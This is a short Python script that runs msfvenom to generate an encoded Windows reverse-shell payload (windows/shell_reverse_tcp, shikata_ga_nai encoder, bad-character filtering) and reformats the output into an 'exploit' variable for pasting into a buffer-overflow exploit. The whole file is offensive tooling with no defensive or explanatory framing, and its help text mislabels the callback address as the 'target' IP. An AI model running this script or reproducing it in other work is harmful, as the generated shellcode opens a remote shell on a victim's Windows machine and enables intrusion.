import argparse
import socket
import subprocess
import sys
import os

class Buffer():
    def __init__(self,TCP_IP, TCP_PORT, BAD_CHAR):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT
        self.BAD_CHAR = BAD_CHAR

    def msfvenon(self):
        os.system("msfvenom -a x86 --platform windows  -p windows/shell_reverse_tcp LHOST={TCP_IP} LPORT={TCP_PORT} EXIT_FUNC=THREAD -b {BAD_CHAR} -e x86/shikata_ga_nai -f py -o tmp_shellcode -v exploit".format(TCP_IP=self.TCP_IP, TCP_PORT=self.TCP_PORT,BAD_CHAR=self.BAD_CHAR))
        #os.system("msfvenom -a x86 --platform windows  -p windows/shell_reverse_tcp LHOST={TCP_IP} LPORT={TCP_PORT} -b {BAD_CHAR} -f c -v shellcode".format(TCP_IP=self.TCP_IP, TCP_PORT=self.TCP_PORT,BAD_CHAR=self.BAD_CHAR))

        #msfvenom_string = 'msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -b "\\x00\\x0a\\x0d" -f python -v shellcode -o shellcode' % (LHOST, LPORT)


    def convert_2_stronly(self):
        with open('tmp_shellcode', 'r') as reader:
            for row in reader:
                removed_bytes = reader.read().replace('b"\\','"\\')
                #print(removed_bytes)

        with open('cleaned_shellcode', 'w') as writer:
            for row in (removed_bytes):
                writer.write(row)


        with open("cleaned_shellcode", "r+") as f: s = f.read(); f.seek(0); f.write("exploit = \"""\"""\n" + s)




if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    parser.add_argument('BAD_CHAR', type=str, help='Specify bad characters: e.g. "\x00\x0A"')
    args = parser.parse_args()
    exec = Buffer(args.TCP_IP, args.TCP_PORT, args.BAD_CHAR)
    exec.msfvenon()
    exec.convert_2_stronly()


